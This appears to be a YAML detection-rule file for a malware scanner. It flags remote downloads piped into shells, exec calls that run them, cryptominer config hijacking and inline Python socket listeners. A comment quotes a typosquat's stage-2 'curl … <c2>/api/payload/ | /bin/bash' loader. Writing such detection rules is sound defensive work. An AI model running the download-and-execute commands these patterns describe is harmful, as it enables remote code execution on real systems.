defaults:
  platforms: [unix]
  for: [shell]
traits:
- id: wget-output-stdout
  desc: "wget output to stdout flag"
  crit: component
  if:
    type: text
    regex: '\bwget(\.exe)?\b[^\n]{0,160}\s-O\s*-(\s|$)'
- id: execute-dot-slash
  desc: "./ execution pattern"
  crit: component
  conf: 0.6
  attack: T1059.004
  if:
    type: text
    regex: '(^|\n|[;&|]{1,2}|\bnohup\s+)\s*\./[a-zA-Z0-9_][a-zA-Z0-9_.-]+'
- id: inline__curl-silent-stdout__any_1
  desc: "Curl silent download pattern 1"
  crit: component
  unless:
  - id: well-known/app/coingecko::benign-coingecko-price-api
  if:
    type: text
    regex: 'curl(\.exe)?\s+[^|&\n]{0,120}-s[^|&\n]{0,120}(https?://|ftp://)'
  not:
  - substr: api.coingecko.com/api/v3/simple/price
- id: inline__curl-silent-stdout__any_2
  desc: "Curl silent download pattern 2"
  crit: component
  unless:
  - id: well-known/app/coingecko::benign-coingecko-price-api
  if:
    type: text
    regex: 'curl(\.exe)?\s+[^|&\n]{0,120}--silent[^|&\n]{0,120}(https?://|ftp://)'
  not:
  - substr: api.coingecko.com/api/v3/simple/price
- id: gpg-import-pipe
  desc: GPG key import via pipe
  crit: component
  if:
    type: text
    regex: '\|\s*([a-z/]+/)?gpg\b\s+--import'
- id: apt-key-add-pipe
  desc: APT key add via pipe
  crit: component
  if:
    type: text
    regex: '\|\s*(sudo\s+)?apt-key\s+add\s+-'
- id: gpg-dearmor-pipe
  desc: GPG dearmor keyring pipe
  crit: component
  if:
    type: text
    regex: '\|\s*gpg\b\s+--dearmor\b'
- id: tee-keyring-pipe
  desc: APT keyring tee pipe
  crit: component
  if:
    type: text
    regex: '\|\s*tee\b[^\n]{0,80}/etc/apt/keyrings/'
# Download-and-execute: a remote fetch piped straight into a shell
# (`curl … | bash`). Scoped to the script/source languages where loaders embed
# this as a string handed to a process-exec API (Node child_process, Ruby system,
# Python subprocess, Go os/exec). Anchored on the curl/wget+pipe+shell triad so
# a stray "| sh" does not fire.
- id: curl-download-pipe-shell
  desc: Remote download piped into a shell
  crit: notable
  conf: 0.9
  for: [shell, python, javascript, typescript, ruby, go, rust]
  unless:
  - id: curl-download-pipe-benign-context
  - id: well-known/app/localai::localai-backend-build-context
  - type: text
    substr: pub struct BashTool
  - type: text
    substr: Destructive commands require user confirmation
  - type: text
    regex: '"slug":"[^"]+"|"sections":\[\{"id":'
  - type: text
    regex: 'https://rclone\.org/install\.sh\s*\|\s*bash\b'
  - type: text
    regex: 'https://astral\.sh/uv/install\.sh\s*\|\s*(sh|bash)\b'
  if:
    # Require whitespace + >=4 non-pipe chars (the URL / flags) between the
    # downloader and the pipe, so a bare mention of "curl|bash" in a comment or
    # doc string does NOT match — only a real `curl <url/flags> | bash`.
    type: text
    regex: '(curl|wget)(\.exe)?\s+[^\n|]{4,200}\|\s*(/usr/bin/|/bin/)?(bash|sh)\b'
- id: curl-pipe-rustup-installer
  desc: rustup installer piped to shell
  crit: component
  conf: 0.9
  for: [shell, python, javascript, typescript, ruby, go, rust, dockerfile]
  if:
    type: text
    regex: 'https://sh\.rustup\.rs\s*\|\s*(bash|sh)\b'
- id: curl-pipe-rclone-installer
  desc: rclone installer piped to bash
  crit: component
  conf: 0.9
  for: [shell, python, javascript, typescript, ruby, go, rust, dockerfile]
  if:
    type: text
    regex: 'https://rclone\.org/install\.sh\s*\|\s*bash\b'
- id: curl-pipe-install-sh-url
  desc: Remote install.sh URL in shell pipe
  crit: component
  conf: 0.86
  for: [shell, python, javascript, typescript, ruby, go, rust]
  if:
    type: text
    regex: '(curl|wget)(\.exe)?\s+[^\n|]{0,160}/install\.sh[^\n|]{0,80}\|'
- id: exec-api-call
  desc: exec API call
  crit: component
  conf: 0.85
  for: [python, javascript, typescript, ruby, go, rust]
  if:
    type: text
    regex: '\bexec(File|Sync)?\s*\('
- id: spawn-api-call
  desc: spawn API call
  crit: component
  conf: 0.85
  for: [python, javascript, typescript, ruby, go, rust]
  if:
    type: text
    regex: '\bspawn(Sync)?\s*\('
- id: system-api-call
  desc: system API call
  crit: component
  conf: 0.85
  for: [python, javascript, typescript, go, rust]
  if:
    type: symbol
    exact: system
- id: subprocess-api-call
  desc: subprocess API call
  crit: component
  conf: 0.85
  for: [python, javascript, typescript, ruby, go, rust]
  if:
    type: text
    regex: '\bsubprocess\.(run|Popen|call)\s*\('
- id: rust-command-new-call
  desc: Rust Command::new call
  crit: component
  conf: 0.85
  for: [rust]
  if:
    type: text
    substr: 'Command::new('
- id: go-exec-command-call
  desc: Go exec.Command call
  crit: component
  conf: 0.85
  for: [go]
  if:
    type: text
    substr: 'exec.Command('
- id: miner-hijack-config
  desc: Hijacking other miner configurations
  crit: suspicious
  if:
    type: text
    substr: 'kill_list.patterns'
- id: miner-config-poisoning
  desc: Poisoning other miner configurations
  crit: suspicious
  if:
    type: text
    substr: 'hijacked_${_hhex}'
- id: python-inline-socket-listener
  desc: Inline Python background socket listener
  crit: suspicious
  conf: 0.9
  if:
    type: text
    regex: "python3?\\s+-c\\s+[\"'].{0,50}socket\\.socket.{0,50}bind.{0,50}listen.{0,50}os\\.fork"
composite_rules:
- id: curl-pipe-obvious-installer
  desc: Remote install.sh piped into shell
  crit: notable
  conf: 0.86
  for: [shell, python, javascript, typescript, ruby, go, rust]
  all:
  - id: curl-pipe-install-sh-url
  - id: micro-behaviors/data/runtime/keywords::pipe-to-shell
- id: curl-download-pipe-benign-installer-context
  desc: Benign installer/documentation curl-pipe context
  crit: component
  conf: 0.9
  any:
  - id: metadata/file/extension/identity::markdown-file-basename
  - id: micro-behaviors/os/service/legitimate::installer-script
  - id: curl-pipe-obvious-installer
  - id: curl-pipe-rustup-installer
  - id: curl-pipe-rclone-installer
- id: curl-download-pipe-benign-context
  desc: Benign curl-pipe context
  crit: component
  conf: 0.9
  any:
  - id: well-known/lib/pyaigis/
  - id: metadata/library/structure::js-dist-asset-bundle
  - id: metadata/library/structure::js-large-module-bundle
  - id: micro-behaviors/os/service/legitimate::ci-cd-pipeline
  - id: curl-download-pipe-benign-installer-context
- id: process-api-call
  desc: Process API invocation
  crit: component
  conf: 0.9
  any:
  - id: exec-api-call
  - id: spawn-api-call
  - id: system-api-call
  - id: objectives/supply-chain/install-hook/package/rubygems::system-call
  - id: subprocess-api-call
  - id: rust-command-new-call
  - id: go-exec-command-call
- id: process-curl-pipe-shell-call
  desc: Process API executes shell pipe
  crit: component
  conf: 0.92
  for: [python, javascript, typescript, ruby, go, rust]
  all:
  - id: process-api-call
  - id: curl-download-pipe-shell
  near_bytes: 768
# A curl|bash download-exec string that the host program executes via a
# process/exec API is remote code execution staged from library/app code —
# never a legitimate pattern for a published package. Language-AGNOSTIC: the
# `micro-behaviors/process/create/` leg matches Node child_process, Ruby
# system/exec, Python subprocess, and Go os/exec alike, so the same loader is
# caught in JS, Ruby, Python, Go, etc. Anchors the @403name/ether-js typosquat
# (Stage 2: `curl -sSfL <c2>/api/payload/ | /bin/bash`).
- id: spawned-curl-pipe-shell-rce
  desc: Spawned curl-pipe-shell remote code execution
  crit: hostile
  conf: 0.97
  attack: "T1059.004"
  for: [python, javascript, typescript, ruby, go, rust]
  all:
  - id: curl-download-pipe-shell
  - id: process-curl-pipe-shell-call
  unless:
  - id: micro-behaviors/os/service/legitimate::tool-installer-framework
  - id: metadata/library/structure::js-dist-asset-bundle
  - id: metadata/library/structure::js-large-module-bundle
  - id: micro-behaviors/os/service/legitimate::ci-cd-pipeline
- id: python-inline-mutex-hostile
  desc: Hostile Python inline socket mutex script
  crit: hostile
  conf: 0.95
  all:
  - id: python-inline-socket-listener
  - id: micro-behaviors/os/sysinfo/network::ss
- id: hostile-miner-hijack
  desc: Known hostile miner hijacking behavior
  crit: hostile
  any:
  - id: miner-hijack-config
  - id: miner-config-poisoning
- id: xmr-miner-config-hijack
  desc: Monero miner configuration hijack chain
  crit: hostile
  conf: 0.98
  attack: T1496
  all:
  - id: miner-hijack-config
  - id: miner-config-poisoning
  any:
  - id: objectives/impact/cryptojacking/pool::domain-2
  - id: objectives/impact/cryptojacking/pool::pool-port-3333-dup
  needs: 2
- id: evasive-xmr-config-poisoner
  desc: Evasive Monero miner config poisoner
  crit: hostile
  conf: 0.97
  attack: T1496
  all:
  - id: xmr-miner-config-hijack
  - id: objectives/evasion/indicator-removal/history::histfile-devnull
- id: shell-fetch-exec-bash
  desc: Shell script downloads and executes via pipe to bash
  crit: hostile
  conf: 0.98
  attack: T1105
  unless:
  - id: well-known/tool/development/ghcup::ghcup-bootstrap-pipe
  all:
  - id: micro-behaviors/process/create/shell/invoke::bash-exec
  - id: micro-behaviors/data/runtime/keywords::pipe-to-shell
  any:
  - id: curl-silent-stdout
  - id: wget-silent-stdout
- id: shell-fetch-exec-curl
  desc: Shell script downloads via curl and executes via pipe
  crit: hostile
  conf: 0.95
  attack: T1105
  unless:
  - id: well-known/tool/development/ghcup::ghcup-bootstrap-pipe
  all:
  - id: micro-behaviors/communications/http/download/curl::curl-cmd
  - id: curl-silent-stdout
  - id: micro-behaviors/data/runtime/keywords::pipe-to-shell
  any:
  - id: micro-behaviors/process/create/shell/invoke::bash-exec
  - id: micro-behaviors/process/create/shell/invoke::bin-sh
- id: shell-fetch-exec-wget
  desc: Shell script downloads via wget and executes via pipe
  crit: hostile
  conf: 0.95
  attack: T1105
  all:
  - id: micro-behaviors/communications/http/download/curl::wget-cmd
  - id: wget-silent-stdout
  - id: micro-behaviors/data/runtime/keywords::pipe-to-shell
  any:
  - id: micro-behaviors/process/create/shell/invoke::bash-exec
  - id: micro-behaviors/process/create/shell/invoke::bin-sh
- id: wget-silent-stdout
  desc: "Silent wget output to stdout"
  crit: suspicious
  conf: 0.9
  mbc: C0002
  attack: T1105
  all:
  - id: micro-behaviors/communications/http/download/curl::wget-cmd
  - id: micro-behaviors/communications/http/download/cli::wget-q-flag
  - id: wget-output-stdout
  unless:
  - id: gpg-import-pipe
  - id: apt-key-add-pipe
  - id: gpg-dearmor-pipe
  - id: tee-keyring-pipe
- id: curl-silent-stdout
  desc: "Silent curl output to stdout"
  crit: suspicious
  conf: 0.9
  mbc: C0002
  attack: T1105
  size_max: 5000
  any:
  - id: inline__curl-silent-stdout__any_1
  - id: inline__curl-silent-stdout__any_2
  unless:
  - id: metadata/file/catalog/identity::os-project-domain
  - id: metadata/file/catalog/identity::platform-domain
  - id: well-known/app/coingecko::benign-coingecko-price-api
